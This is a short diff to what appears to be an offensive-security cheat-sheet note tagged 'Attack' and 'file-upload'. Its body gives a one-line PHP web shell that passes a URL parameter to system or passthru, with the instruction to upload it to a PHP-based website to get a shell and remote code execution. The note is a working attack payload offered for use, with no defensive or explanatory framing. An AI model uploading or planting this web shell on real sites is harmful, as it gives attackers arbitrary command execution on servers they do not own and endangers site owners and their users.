@@ -1,3 +1,8 @@
+---
+tags:
+  - Attack
+  - Bugs/file-upload
+---
 shell.php -> 
 <?php system($_GET['cmd']); ?> OR <?php passthru($_GET['cmd']); ?>
 -  Upload this php file in a php based website to get shell(RCE).
